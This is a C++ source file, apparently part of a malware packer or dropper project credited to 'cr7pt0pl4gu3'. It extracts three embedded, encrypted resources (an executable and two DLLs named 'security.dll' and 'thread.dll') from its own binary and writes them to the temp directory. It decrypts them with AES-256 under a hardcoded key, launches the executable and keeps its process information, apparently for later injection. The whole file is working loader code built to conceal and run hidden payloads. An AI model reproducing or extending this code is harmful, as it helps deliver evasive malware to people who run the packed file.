/* ResourceLoader by cr7pt0pl4gu3. */

#define UNICODE
#include <Windows.h>
#include <iostream>
#include <filesystem>
#include "../resources/resources.hpp"
#include "../error-wrapper/error.hpp"
#include "../aes256/aes256decrypt.hpp"

// Function to load the resources, and then launch them
PROCESS_INFORMATION loadResource()
{
    // Finding the .exe and the .dll resource
    HMODULE hModule {nullptr};

    HRSRC hExeResource {FindResource(nullptr, (LPCWSTR)IDR_EXE, RT_RCDATA)};
    HRSRC hDllResource {FindResource(nullptr, (LPCWSTR)IDR_DLL, RT_RCDATA)};
    HRSRC hThrResource {FindResource(nullptr, (LPCWSTR)IDR_THR, RT_RCDATA)};

    HGLOBAL hExeGlobal;
    HGLOBAL hDllGlobal;
    HGLOBAL hThrGlobal;

    BYTE * pExeResource;
    BYTE * pDllResource;
    BYTE * pThrResource;

    HANDLE hExeFile {INVALID_HANDLE_VALUE};
    HANDLE hDllFile {INVALID_HANDLE_VALUE};
    HANDLE hThrFile {INVALID_HANDLE_VALUE};

    // Calculating resources size dynamically
    DWORD exeSize {SizeofResource(hModule, hExeResource)};
    DWORD dllSize {SizeofResource(hModule, hDllResource)};
    DWORD thrSize {SizeofResource(hModule, hThrResource)};

    // Structure that we want to use with CreateProcess(), returning PROCESS_INFORMATION for the pi.dwProcessId
    STARTUPINFOA si {sizeof(si)};
    PROCESS_INFORMATION pi {};

    if ((hExeResource == nullptr) || (hDllResource == nullptr) || (hThrResource == nullptr))
    {
        Error("Unable to find resources!\n");
    }

    hExeGlobal = LoadResource(nullptr, hExeResource);
    hDllGlobal = LoadResource(nullptr, hDllResource);
    hThrGlobal = LoadResource(nullptr, hThrResource);

    if ((hExeGlobal == nullptr) || (hDllGlobal == nullptr) || (hThrGlobal == nullptr))
    {
        Error("Unable to load resources!\n");
    }

    pExeResource = (BYTE*)LockResource(hExeGlobal);
    pDllResource = (BYTE*)LockResource(hDllGlobal);
    pThrResource = (BYTE*)LockResource(hThrGlobal);

    if ((pExeResource == nullptr) || (pDllResource == nullptr) || (pThrResource == nullptr))
    {
        Error("Unable to lock resources and convert them to BYTE*!\n");
    }

    // Creating files for launching (REDO AS A FUNCTION)
    std::string sExePath {std::filesystem::temp_directory_path().string().append("unpacked.exe")};
    const char* cExePath {sExePath.c_str()};
    hExeFile = CreateFileA(cExePath, GENERIC_WRITE | GENERIC_READ, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);

    std::string sDllPath {std::filesystem::temp_directory_path().string().append("security.dll")};
    const char* cDllPath {sDllPath.c_str()};
    hDllFile = CreateFileA(cDllPath, GENERIC_WRITE | GENERIC_READ, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);

    std::string sThrPath {std::filesystem::temp_directory_path().string().append("thread.dll")};
    const char* cThrPath {sThrPath.c_str()};
    hThrFile = CreateFileA(cThrPath, GENERIC_WRITE | GENERIC_READ, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);

    if ((hExeFile != INVALID_HANDLE_VALUE) && (hDllFile != INVALID_HANDLE_VALUE) && (hThrFile != INVALID_HANDLE_VALUE))
    {
        DWORD bytesExeWritten {0};
        WriteFile(hExeFile, pExeResource, exeSize, &bytesExeWritten, nullptr);
        CloseHandle(hExeFile);

        DWORD bytesDllWritten {0};
        WriteFile(hDllFile, pDllResource, dllSize, &bytesDllWritten, nullptr);
        CloseHandle(hDllFile);

        DWORD bytesThrWritten {0};
        WriteFile(hThrFile, pThrResource, thrSize, &bytesThrWritten, nullptr);
        CloseHandle(hThrFile);
    }
    else
    {
        Error("Unable to create files!\n");
    }

    // Decrypt the resources
    std::string key {"abcdefghijklmnop"};
    char* cKey = key.data();
    AES256Decrypt(cExePath, cKey);
    AES256Decrypt(cDllPath, cKey);
    AES256Decrypt(cThrPath, cKey);

    // Launching the file and returning the pi structure for future use
    CreateProcessA(cExePath,
                  nullptr , nullptr, nullptr, FALSE,
                  CREATE_NEW_CONSOLE,
                  nullptr, nullptr, &si, &pi);
    return pi;
}